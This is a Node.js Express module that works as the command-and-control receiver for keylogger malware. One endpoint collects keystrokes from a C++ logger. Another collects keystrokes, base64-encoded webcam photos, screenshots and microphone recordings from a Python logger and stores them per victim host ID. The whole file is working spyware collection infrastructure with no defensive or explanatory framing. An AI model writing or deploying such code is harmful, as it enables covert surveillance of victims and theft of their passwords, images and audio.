var bodyParser = require('body-parser');
var fs = require('fs');
let time = require('date-and-time');

var INDEX = 0;
var CPP_LOG_DIR = "./loggerserver/winhttplogger"; // log dir for C++ logger
var PYTHON_LOG_DIR = "./loggerserver/pythonlogger";

module.exports = function (app) {
    app.post('/winhttp/', function(req, res) { // PART FOR C++ SIMPLELOGGER
	var keys = req.body['keys'];
	if (!fs.existsSync(CPP_LOG_DIR)){
		fs.mkdirSync(CPP_LOG_DIR);
	}
	if (fs.existsSync(CPP_LOG_DIR+"/data")) {
		let now = new Date();
		var date = '\r\n'+time.format(now, 'YYYY/MM/DD HH:mm:ss')+"\r\n";
	    fs.appendFile(CPP_LOG_DIR+"/data", keys+date+"\r\n", (err) => {
		  if (err) throw err;
		  console.log("Appended to file: " + keys);
	  });
    } else {
		let now = new Date();
		var date = '\r\n'+time.format(now, 'YYYY/MM/DD HH:mm:ss')+"\r\n";
	    fs.writeFile(CPP_LOG_DIR+"/data", keys+date+"\r\n", function(err) {
	    if (err) {
		    return console.log(err);
	    }
		console.log("Keys data created, written: " +keys);
	});
	}
	res.send("OK ->");
});
app.post('/', function(req, res) { // PART FOR PYTHON LOGGER
	var keys = req.body['keys'];
	var screenshot = req.body['ss'];
	var camPic = req.body['camPic'];
	var sound = req.body['audio'];
	var host_id = req.body['sender_id'];
	var dir = PYTHON_LOG_DIR+"/"+host_id+"";
	if (!fs.existsSync(PYTHON_LOG_DIR)){
		fs.mkdirSync(PYTHON_LOG_DIR);
		if (!fs.existsSync(dir)){
			fs.mkdirSync(dir);
		}
	}
	var camImg = Buffer.from(camPic, 'base64');
	var ssImg = Buffer.from(screenshot, 'base64'); 
	var rec = Buffer.from(sound, 'base64'); 
	fs.writeFile(dir+"/"+"cam_img_"+INDEX+".png", camImg, "binary",function(err) {
		if (err) {
			console.log(err);
		} else {
			console.log("Host id: "+host_id);
			console.log("Webcam pic saved.");
		}
	});
	fs.writeFile(dir+"/"+"ss_img"+INDEX+".png", ssImg, "binary",function(err) {
		if (err) {
			console.log(err);
		} else {
			console.log("Screenshot saved.");
		}
	});
	fs.writeFile(dir+"/"+"rec_"+INDEX+".wav", rec, "binary",function(err) {
		if (err) {
			console.log(err);
		} else {
			console.log("Recording saved.");
		}
	});
	if (fs.existsSync(dir+"/data")) {
		let now = new Date();
		var date = '\r\n'+time.format(now, 'YYYY/MM/DD HH:mm:ss')+"\r\n";
	    fs.appendFile(dir+"/data", keys+date+"\r\n", (err) => {
		  if (err) throw err;
		  console.log("Appended to file: " + keys);
	  });
    } else {
		let now = new Date();
		var date = '\r\n'+time.format(now, 'YYYY/MM/DD HH:mm:ss')+"\r\n";
	    fs.writeFile(dir+"/data", keys+date+"\r\n", function(err) {
	    if (err) {
		    return console.log(err);
	    }
		console.log("Keys data created.");
	});
	}
	INDEX = INDEX + 1;
	console.log("Index: "+INDEX);
	res.send("OK");
});
}